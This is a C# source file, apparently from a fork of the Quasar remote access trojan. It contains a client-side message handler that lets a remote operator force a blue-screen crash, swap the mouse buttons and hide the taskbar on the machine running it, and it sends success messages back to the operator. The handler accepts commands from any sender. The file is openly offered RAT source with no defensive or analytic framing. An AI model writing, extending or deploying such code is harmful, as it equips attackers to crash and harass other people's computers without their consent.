using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.other;
using Quasar.Client.FunStuff;

namespace Quasar.Client.Messages
{

    public class FunStuffHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoBSOD || message is DoSwapMouseButtons || message is DoHideTaskbar;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoBSOD msg:
                    Execute(sender, msg);
                    break;
                case DoSwapMouseButtons msg:
                    Execute(sender, msg);
                    break;
                case DoHideTaskbar msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoBSOD message)
        {
            client.Send(new SetStatus { Message = "Successfull BSOD" });

            BSOD.DOBSOD();
        }

        private void Execute(ISender client, DoSwapMouseButtons message)
        {
            try
            {
                SwapMouseButtons.SwapMouse();
                client.Send(new SetStatus { Message = "Successfull Mouse Swap" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to swap mouse buttons" });
            }
        }

        private void Execute(ISender client, DoHideTaskbar message)
        {
            try
            {
                client.Send(new SetStatus { Message = "Successfull Hide Taskbar" });
                HideTaskbar.DoHideTaskbar();
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to hide taskbar" });
            }
        }
    }
}
